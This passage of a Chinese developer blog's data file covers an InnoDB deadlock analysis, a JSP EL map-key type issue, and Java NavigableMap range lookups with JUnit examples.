class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------</div><div class=\"line\">TRANSACTIONS</div><div class=\"line\">------------</div><div class=\"line\">Trx id counter 41123</div><div class=\"line\">Purge <span class=\"keyword\">done</span> <span class=\"keyword\">for</span> trx<span class=\"string\">'s n:o &lt; 41120 undo n:o &lt; 0 state: running but idle</div><div class=\"line\">History list length 968</div><div class=\"line\">LIST OF TRANSACTIONS FOR EACH SESSION:</div><div class=\"line\">---TRANSACTION 0, not started</div><div class=\"line\">MySQL thread id 67, OS thread handle 0x700000ac7000, query id 37547 localhost ::1 root init</div><div class=\"line\">show ENGINE innodb status</div><div class=\"line\">---TRANSACTION 41105, not started</div><div class=\"line\">MySQL thread id 65, OS thread handle 0x700000b0b000, query id 36363 localhost 127.0.0.1 root cleaning up</div><div class=\"line\">---TRANSACTION 0, not started</div><div class=\"line\">MySQL thread id 64, OS thread handle 0x700000b4f000, query id 36362 localhost 127.0.0.1 root cleaning up</div><div class=\"line\">---TRANSACTION 0, not started</div><div class=\"line\">MySQL thread id 58, OS thread handle 0x700000a3f000, query id 37546 localhost root cleaning up</div><div class=\"line\">---TRANSACTION 41122, ACTIVE 26 sec</div><div class=\"line\">4 lock struct(s), heap size 1184, 3 row lock(s)</div><div class=\"line\">MySQL thread id 69, OS thread handle 0x700000bd7000, query id 37534 localhost ::1 root cleaning up</div><div class=\"line\">TABLE LOCK table `test`.`t` trx id 41122 lock mode IX</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41122 lock_mode X locks rec but not gap</div><div class=\"line\">Record lock, heap no 7 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 6; hex 00000000a08b; asc       ;;</div><div class=\"line\"> 2: len 7; hex dd000001fa011d; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 9 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 8000000f; asc     ;;</div><div class=\"line\"> 1: len 4; hex 8000000f; asc     ;;</div><div class=\"line\"></div><div class=\"line\">---TRANSACTION 41121, ACTIVE 34 sec inserting</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">LOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update</div><div class=\"line\">insert INTO t values (6, 6)</div><div class=\"line\">------- TRX HAS BEEN WAITING 21 SEC FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">------------------</div><div class=\"line\">TABLE LOCK table `test`.`t` trx id 41121 lock mode IX</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X</div><div class=\"line\">Record lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41121 lock_mode X locks rec but not gap</div><div class=\"line\">Record lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 6; hex 00000000a08b; asc       ;;</div><div class=\"line\"> 2: len 7; hex dd000001fa0110; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</span></div></pre></td></tr></table></figure>\n<h3 id=\"3-死锁日志\"><a href=\"#3-死锁日志\" class=\"headerlink\" title=\"3. 死锁日志\"></a>3. 死锁日志</h3><p>事务T2执行记录插入操作，发生死锁。<br>死锁日志如下所示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">2016-08-04 13:39:05 700000bd7000</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 41121, ACTIVE 54 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">LOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo <span class=\"built_in\">log</span> entries 1</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update</div><div class=\"line\">insert INTO t values (6, 6)</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) TRANSACTION:</div><div class=\"line\">TRANSACTION 41122, ACTIVE 46 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">5 lock struct(s), heap size 1184, 4 row lock(s), undo <span class=\"built_in\">log</span> entries 1</div><div class=\"line\">MySQL thread id 69, OS thread handle 0x700000bd7000, query id 37555 localhost ::1 root update</div><div class=\"line\">insert INTO t values (7, 7)</div><div class=\"line\">*** (2) HOLDS THE LOCK(S):</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41122 lock_mode X</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41122 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** WE ROLL BACK TRANSACTION (2)</div></pre></td></tr></table></figure>\n<p>由上述死锁日志可知：两个事务都在等待加在这个位置的锁 <strong>space id 245 page no 4 n bits 80</strong>。<br>另外，</p>\n<h3 id=\"4-解读InnoDB运行状态\"><a href=\"#4-解读InnoDB运行状态\" class=\"headerlink\" title=\"4. 解读InnoDB运行状态\"></a>4. 解读InnoDB运行状态</h3><h4 id=\"事务T1\"><a href=\"#事务T1\" class=\"headerlink\" title=\"事务T1\"></a>事务T1</h4><p>事务T1总共 <strong>要加</strong> 5把锁：1把表，4把行锁。</p>\n<p><strong>表锁</strong><br>表锁类型：IX</p>\n<p><strong>行锁</strong><br>idx_b 上的排他 next-key lock，范围：idx_b in (1, 4]。<br>内存位置：space id 245 page no 4 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 2;</p>\n<p>primary 上的排他 record lock，范围：primary=4。<br>内存位置：space id 245 page no 3 n bits 80，heap no 6 PHYSICAL RECORD: n_fields 4;</p>\n<p>idx_b 上的排他 gap lock，范围：idx_b in (4, 9)。<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p>\n<p>idx_b 上的排他 insert intention lock，范围：idx_b in (4, 9)。<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p>\n<p>其中，insert intention lock 是正等待加的锁。</p>\n<h4 id=\"事务T2\"><a href=\"#事务T2\" class=\"headerlink\" title=\"事务T2\"></a>事务T2</h4><p><strong>注</strong>：当前分析事务T2占用的锁快照为T2执行插入语句之前状态。</p>\n<p>事务T2总共加了4把锁：1把表，3把行锁。</p>\n<p><strong>表锁</strong><br>表锁类型：IX</p>\n<p><strong>行锁</strong><br>idx_b 上的排他 next-key lock，范围：idx_b in (4， 9]<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p>\n<p>primary 上的排他 record lock，范围：primary=9<br>内存位置：space id 245 page no 3 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 4;</p>\n<p>idx_b 上的排他 gap lock，范围：idx_b in (9， 15)<br>内存位置：space id 245 page no 4 n bits 80，heap no 9 PHYSICAL RECORD: n_fields 2;</p>\n<h4 id=\"死锁分析\"><a href=\"#死锁分析\" class=\"headerlink\" title=\"死锁分析\"></a>死锁分析</h4><p>在事务T1插入记录前，事务T1拿到了范围idx_b in (4, 9)的gap lock，事务T2拿到了范围idx_b in (4， 9]上的next-key lock。</p>\n<p>事务T1插入记录(6, 6)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T2已持有next key lock是互斥的。<br>于是，事务T1 block，等待事务T2释放范围idx_b in (4， 9]上的next-key lock。</p>\n<p>事务T2插入记录(7, 7)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T1已持有的gap lock是互斥的。<br>于是，事务T2也会block，等待事务T2释放范围idx_b in (4， 9)上的gap lock。<br>死锁便产生了。</p>"},{"title":"EL access a map value by Integer key","date":"2016-02-28T08:24:00.000Z","_content":"\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\nel表达式中，默认数值类型为Long型。\n\n## 一、问题描述\n\n**举例说明**：\nservlet定义并返回map数据如下：\n``` java\nMap<Integer, String> map = new HashMap<Integer, String>();\nmap.put(1, \"One\");\nmap.put(2, \"Two\");\nmap.put(3, \"Three\");\n```\n\n在jsp页面，通过map[2]不能获取数据Two。因为数值2被装箱成Long型，而map键类型为Integer。\n因此，在前端不能通过，报异常。\n\n\n## 二、解决方案\n将数值转成int型，如下所示：\n`${map[(2).intValue()]}`\n\n\n## 三、参考文档\nhttp://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key","source":"_posts/article/java/EL access a map value by Integer key.md","raw":"title: EL access a map value by Integer key\ntags:\n  - el\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:24:00\n---\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\nel表达式中，默认数值类型为Long型。\n\n## 一、问题描述\n\n**举例说明**：\nservlet定义并返回map数据如下：\n``` java\nMap<Integer, String> map = new HashMap<Integer, String>();\nmap.put(1, \"One\");\nmap.put(2, \"Two\");\nmap.put(3, \"Three\");\n```\n\n在jsp页面，通过map[2]不能获取数据Two。因为数值2被装箱成Long型，而map键类型为Integer。\n因此，在前端不能通过，报异常。\n\n\n## 二、解决方案\n将数值转成int型，如下所示：\n`${map[(2).intValue()]}`\n\n\n## 三、参考文档\nhttp://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key","slug":"article/java/EL access a map value by Integer key","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrm002m5nbt355h27r5","content":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\"></p>\n<p>el表达式中，默认数值类型为Long型。</p>\n<h2 id=\"一、问题描述\"><a href=\"#一、问题描述\" class=\"headerlink\" title=\"一、问题描述\"></a>一、问题描述</h2><p><strong>举例说明</strong>：<br>servlet定义并返回map数据如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">Map&lt;Integer, String&gt; map = <span class=\"keyword\">new</span> HashMap&lt;Integer, String&gt;();</div><div class=\"line\">map.put(<span class=\"number\">1</span>, <span class=\"string\">\"One\"</span>);</div><div class=\"line\">map.put(<span class=\"number\">2</span>, <span class=\"string\">\"Two\"</span>);</div><div class=\"line\">map.put(<span class=\"number\">3</span>, <span class=\"string\">\"Three\"</span>);</div></pre></td></tr></table></figure></p>\n<p>在jsp页面，通过map[2]不能获取数据Two。因为数值2被装箱成Long型，而map键类型为Integer。<br>因此，在前端不能通过，报异常。</p>\n<h2 id=\"二、解决方案\"><a href=\"#二、解决方案\" class=\"headerlink\" title=\"二、解决方案\"></a>二、解决方案</h2><p>将数值转成int型，如下所示：<br><code>${map[(2).intValue()]}</code></p>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key\" target=\"_blank\" rel=\"external\">http://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" /></p>\n<p>el表达式中，默认数值类型为Long型。</p>\n<h2 id=\"一、问题描述\"><a href=\"#一、问题描述\" class=\"headerlink\" title=\"一、问题描述\"></a>一、问题描述</h2><p><strong>举例说明</strong>：<br>servlet定义并返回map数据如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">Map&lt;Integer, String&gt; map = <span class=\"keyword\">new</span> HashMap&lt;Integer, String&gt;();</div><div class=\"line\">map.put(<span class=\"number\">1</span>, <span class=\"string\">\"One\"</span>);</div><div class=\"line\">map.put(<span class=\"number\">2</span>, <span class=\"string\">\"Two\"</span>);</div><div class=\"line\">map.put(<span class=\"number\">3</span>, <span class=\"string\">\"Three\"</span>);</div></pre></td></tr></table></figure></p>\n<p>在jsp页面，通过map[2]不能获取数据Two。因为数值2被装箱成Long型，而map键类型为Integer。<br>因此，在前端不能通过，报异常。</p>\n<h2 id=\"二、解决方案\"><a href=\"#二、解决方案\" class=\"headerlink\" title=\"二、解决方案\"></a>二、解决方案</h2><p>将数值转成int型，如下所示：<br><code>${map[(2).intValue()]}</code></p>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key\">http://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key</a></p>\n"},{"title":"java范围映射","date":"2016-08-11T07:13:00.000Z","_content":"\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 一、背景\n近期一个功能开发涉及到一个核心业务规则为：根据消费额实行阶梯计价，额度处于的阶梯档位不同，对应的单价不同，需要根据给定的消费额找到对应的消费单价。\n\n\n## 二、问题分析\n阶梯计价翻译成编码逻辑，先容易想到是一个映射，即：Map。\n不过特殊的地方在于，这是一个范围映射，将一个范围的键值映射到一个固定的值。\n下来我们来看一下这种范围映射逻辑如何使用java程序来表现。\n\n\n## 三、范围映射分类\n范围映射按其连续性，可以简单分为如下两类情形：\n\n### 1. 连续的范围映射\n例如：计价阶梯就是连续的范围映射。\n大多数情况下，计价阶梯都是连续的情况。\n\n#### 场景举例\n举个大家都熟悉的场景：北京移动套餐外流量资费。这一流量资费在某个时期就是阶梯计价的，消费阶梯是连续的。\n具体的阶梯计价映射关系如下：\n\n| 流量消费阶梯 | 流量单价 |\n|---|---|\n| [0,100MB) | 0.15元/MB |\n| [100MB,500MB)  | 0.08元/MB|\n| [500MB,1GB) | 0.05元/MB |\n| [1GB,2GB) | 0.04元/MB|\n| [2GB,15GB) | 0.03元/MB |\n| [15GB,∞) | 0.01元/MB |\n\n<!-- more -->\n\n\n#### 实现代码\n``` java\npackage cn.yeshaoting.demo;\n\nimport java.util.List;\nimport java.util.Map.Entry;\nimport java.util.NavigableMap;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.google.common.collect.Lists;\nimport com.google.common.collect.Maps;\n\n/**\n * @description 阶梯计价\n * @author yeshaoting\n * @date Aug 8, 2016 12:26:39 PM\n */\npublic class SteppedCalculateTest {\n\n    // 流量下界阶梯\n    private NavigableMap<Integer, Double> steppedFloorFlows = Maps.newTreeMap();\n    \n    private final static int GB = 1000;\n    \n    @Before\n    public void init() {\n        steppedFloorFlows.put(0, 0.15);\n        steppedFloorFlows.put(100, 0.08);\n        steppedFloorFlows.put(500, 0.05);\n        steppedFloorFlows.put(GB * 1, 0.04);\n        steppedFloorFlows.put(GB * 2, 0.03);\n        steppedFloorFlows.put(GB * 15, 0.01);\n    }\n    \n    @Test\n    public void continuousStepTest() {\n        List<Integer> flows = Lists.newArrayList(70, 100, 200, 500, GB * 20);\n        calculate(flows);\n    }\n    \n    private void calculate(List<Integer> flows) {\n        for (Integer flow : flows) {\n            Entry<Integer, Double> entry = steppedFloorFlows.floorEntry(flow);\n            System.out.println(\"消费额:\" + flow + \"MB\\t -> 档位:\" + entry.getKey() + \"\\t单价:\" + entry.getValue());\n        }\n    }\n}\n```\n\n#### 执行结果\n``` bash\n消费额:70\t -> 档位:0\t单价:0.15\n消费额:100\t -> 档位:100\t单价:0.08\n消费额:200\t -> 档位:100\t单价:0.08\n消费额:500\t -> 档位:500\t单价:0.05\n消费额:20000\t -> 档位:15000\t单价:0.03\n```\n\n\n### 2. 不连续的范围映射\n某些特殊的业务场景需要实现不连续的范围映射。\n\n#### 范围映射\n| 范围 | 值 |\n|---|---|\n| [0,3) | 0 |\n| [5,10)  | 1|\n| [100,200) | 2 |\n\n#### 实现代码\n``` java\npackage cn.yeshaoting.demo;\n\nimport java.util.List;\nimport java.util.Map.Entry;\nimport java.util.NavigableMap;\n\nimport org.apache.commons.lang3.tuple.Pair;\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.google.common.collect.Lists;\nimport com.google.common.collect.Maps;\n\n/**\n * @description 范围映射\n * @author yeshaoting\n * @date Aug 8, 2016 12:26:39 PM\n */\npublic class RangeCalculateTest {\n\n    // 范围映射\n    private NavigableMap<Integer, Pair<Integer, Integer>> ranges = Maps.newTreeMap();\n    \n    @Before\n    public void init() {\n        ranges.put(0, Pair.of(3, 0));       // 0..3     => 0\n        ranges.put(5, Pair.of(10, 1));      // 5..10    => 1\n        ranges.put(100, Pair.of(200, 2));   // 100..200 => 2\n    }\n    \n    @Test\n    public void uncontinuousStepTest() {\n        List<Integer> values = Lists.newArrayList(2, 3, 7, 10, 100, 150, 300);\n        calculate(values);\n    }\n    \n    private void calculate(List<Integer> values) {\n        for (Integer value : values) {\n            Entry<Integer, Pair<Integer, Integer>> entry = ranges.floorEntry(value);\n            Pair<Integer, Integer> pair = entry.getValue();\n            if (value < pair.getKey()) {\n                System.out.println(\"值:\" + value + \"\\t -> 范围:[\" + entry.getKey() + \",\" + pair.getKey()  + \")\\t值:\" + pair.getValue());\n            } else {\n                System.out.println(\"值:\" + value + \"\\t -> 未包含的范围\");\n            }\n        }\n    }\n}\n```\n\n#### 执行结果\n``` bash\n值:2\t -> 范围:[0,3)\t值:0\n值:3\t -> 未包含的范围\n值:7\t -> 范围:[5,10)\t值:1\n值:10\t -> 未包含的范围\n值:100\t -> 范围:[100,200)\t值:2\n值:150\t -> 范围:[100,200)\t值:2\n值:300\t -> 未包含的范围\n```\n\n\n## 四、小结\n范围映射实现的核心类：java.util.NavigableMap\n\n### 1. 常用方法\n| 方法 | 说明 |\n|---|---|\n| floorEntry | 返回小于等于指定key中的所有key中最大的一个key |\n| ceilingEntry | 返回大于等于指定key中的所有key中最小的一个key |\n| lowerEntry | 返回小于指定key中的所有key总最大的一个key |\n| higherEntry | 返回大于指定key中的所有key中最小的一个key |\n\n### 2. 详解说明\n``` java\npublic interface NavigableMap<K, V> extends SortedMap<K, V> {\n    // 获取小于指定key的第一个节点对象\n    Map.Entry<K, V> lowerEntry(K key);\n\n    // 获取小于指定key的第一个key\n    K lowerKey(K key);\n\n    // 获取小于或等于指定key的第一个节点对象\n    Map.Entry<K, V> floorEntry(K key);\n\n    // 获取小于或等于指定key的第一个key\n    K floorKey(K key);\n\n    // 获取大于或等于指定key的第一个节点对象\n    Map.Entry<K, V> ceilingEntry(K key);\n\n    // 获取大于或等于指定key的第一个key\n    K ceilingKey(K key);\n\n    // 获取大于指定key的第一个节点对象\n    Map.Entry<K, V> higherEntry(K key);\n\n    // 获取大于指定key的第一个key\n    K higherKey(K key);\n\n    // 获取Map的第一个（最小的）节点对象\n    Map.Entry<K, V> firstEntry();\n\n    // 获取Map的最后一个（最大的）节点对象\n    Map.Entry<K, V> lastEntry();\n\n    // 获取Map的第一个节点对象，并从Map中移除改节点\n    Map.Entry<K, V> pollFirstEntry();\n\n    // 获取Map的最后一个节点对象，并从Map中移除改节点\n    Map.Entry<K, V> pollLastEntry();\n\n    // 返回当前Map的逆序Map集合\n    NavigableMap<K, V> descendingMap();\n\n    // 返回当前Map中包含的所有key的Set集合\n    NavigableSet<K> navigableKeySet();\n\n    // 返回当前map的逆序Set集合，Set由key组成\n    NavigableSet<K> descendingKeySet();\n\n    // 返回当前map中介于fromKey（fromInclusive是否包含）和toKey（toInclusive是否包含） 之间的子map\n    NavigableMap<K, V> subMap(K fromKey, boolean fromInclusive, K toKey, boolean toInclusive);\n\n    // 返回介于map第一个元素到toKey（inInclusive是否包含）之间的子map\n    NavigableMap<K, V> headMap(K toKey, boolean inclusive);\n\n    // 返回当前map中介于fromKey（inInclusive是否包含） 到map最后一个元素之间的子map\n    NavigableMap<K, V> tailMap(K fromKey, boolean inclusive);\n\n    // 返回当前map中介于fromKey（包含）和toKey（不包含）之间的子map\n    SortedMap<K, V> subMap(K fromKey, K toKey);\n\n    // 返回介于map第一个元素到toKey（不包含）之间的子map\n    SortedMap<K, V> headMap(K toKey);\n\n    // 返回当前map中介于fromKey（包含） 到map最后一个元素之间的子map\n    SortedMap<K, V> tailMap(K fromKey);\n}\n```\n\n\n## 五、参考文档\n1. [Using java map for range searches](http://stackoverflow.com/questions/1314650/using-java-map-for-range-searches/1314708#1314708)\n2. [给jdk写注释系列之jdk1.6容器(8)：TreeSet、NavigableMap、NavigableSet源码解析](http://www.importnew.com/17620.html)\n3. [Java集合<10> (NavigableMap)](http://my.oschina.net/kevinair/blog/191242)\n\n","source":"_posts/article/java/java范围映射.md","raw":"title: java范围映射\ntags:\n  - java\ncategories:\n  - 后端开发\ndate: 2016-08-11 15:13:00\n---\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 一、背景\n近期一个功能开发涉及到一个核心业务规则为：根据消费额实行阶梯计价，额度处于的阶梯档位不同，对应的单价不同，需要根据给定的消费额找到对应的消费单价。\n\n\n## 二、问题分析\n阶梯计价翻译成编码逻辑，先容易想到是一个映射，即：Map。\n不过特殊的地方在于，这是一个范围映射，将一个范围的键值映射到一个固定的值。\n下来我们来看一下这种范围映射逻辑如何使用java程序来表现。\n\n\n## 三、范围映射分类\n范围映射按其连续性，可以简单分为如下两类情形：\n\n### 1. 连续的范围映射\n例如：计价阶梯就是连续的范围映射。\n大多数情况下，计价阶梯都是连续的情况。\n\n#### 场景举例\n举个大家都熟悉的场景：北京移动套餐外流量资费。这一流量资费在某个时期就是阶梯计价的，消费阶梯是连续的。\n具体的阶梯计价映射关系如下：\n\n| 流量消费阶梯 | 流量单价 |\n|---|---|\n| [0,100MB) | 0.15元/MB |\n| [100MB,500MB)  | 0.08元/MB|\n| [500MB,1GB) | 0.05元/MB |\n| [1GB,2GB) | 0.04元/MB|\n| [2GB,15GB) | 0.03元/MB |\n| [15GB,∞) | 0.01元/MB |\n\n<!-- more -->\n\n\n#### 实现代码\n``` java\npackage cn.yeshaoting.demo;\n\nimport java.util.List;\nimport java.util.Map.Entry;\nimport java.util.NavigableMap;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.google.common.collect.Lists;\nimport com.google.common.collect.Maps;\n\n/**\n * @description 阶梯计价\n * @author yeshaoting\n * @date Aug 8, 2016 12:26:39 PM\n */\npublic class SteppedCalculateTest {\n\n    // 流量下界阶梯\n    private NavigableMap<Integer, Double> steppedFloorFlows = Maps.newTreeMap();\n    \n    private final static int GB = 1000;\n    \n    @Before\n    public void init() {\n        steppedFloorFlows.put(0, 0.15);\n        steppedFloorFlows.put(100, 0.08);\n        steppedFloorFlows.put(500, 0.05);\n        steppedFloorFlows.put(GB * 1, 0.04);\n        steppedFloorFlows.put(GB * 2, 0.03);\n        steppedFloorFlows.put(GB * 15, 0.01);\n    }\n    \n    @Test\n    public void continuousStepTest() {\n        List<Integer> flows = Lists.newArrayList(70, 100, 200, 500, GB * 20);\n        calculate(flows);\n    }\n    \n    private void calculate(List<Integer> flows) {\n        for (Integer flow : flows) {\n            Entry<Integer, Double> entry = steppedFloorFlows.floorEntry(flow);\n            System.out.println(\"消费额:\" + flow + \"MB\\t -> 档位:\" + entry.getKey() + \"\\t单价:\" + entry.getValue());\n        }\n    }\n}\n```\n\n#### 执行结果\n``` bash\n消费额:70\t -> 档位:0\t单价:0.15\n消费额:100\t -> 档位:100\t单价:0.08\n消费额:200\t -> 档位:100\t单价:0.08\n消费额:500\t -> 档位:500\t单价:0.05\n消费额:20000\t -> 档位:15000\t单价:0.03\n```\n\n\n### 2. 不连续的范围映射\n某些特殊的业务场景需要实现不连续的范围映射。\n\n#### 范围映射\n| 范围 | 值 |\n|---|---|\n| [0,3) | 0 |\n| [5,10)  | 1|\n| [100,200) | 2 |\n\n#### 实现代码\n``` java\npackage cn.yeshaoting.demo;\n\nimport java.util.List;\nimport java.util.Map.Entry;\nimport java.util.NavigableMap;\n\nimport org.apache.commons.lang3.tuple.Pair;\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.google.common.collect.Lists;\nimport com.google.common.collect.Maps;\n\n/**\n * @description 范围映射\n * @author yeshaoting\n * @date Aug 8, 2016 12:26:39 PM\n */\npublic class RangeCalculateTest {\n\n    // 范围映射\n    private NavigableMap<Integer, Pair<Integer, Integer>> ranges = Maps.newTreeMap();\n    \n    @Before\n    public void init() {\n        ranges.put(0, Pair.of(3, 0));       // 0..3     => 0\n        ranges.put(5, Pair.of(10, 1));      // 5..10    => 1\n        ranges.put(100, Pair.of(200, 2));   // 100..200 => 2\n    }\n    \n    @Test\n    public void uncontinuousStepTest() {\n        List<Integer> values = Lists.newArrayList(2, 3, 7, 10, 100, 150, 300);\n        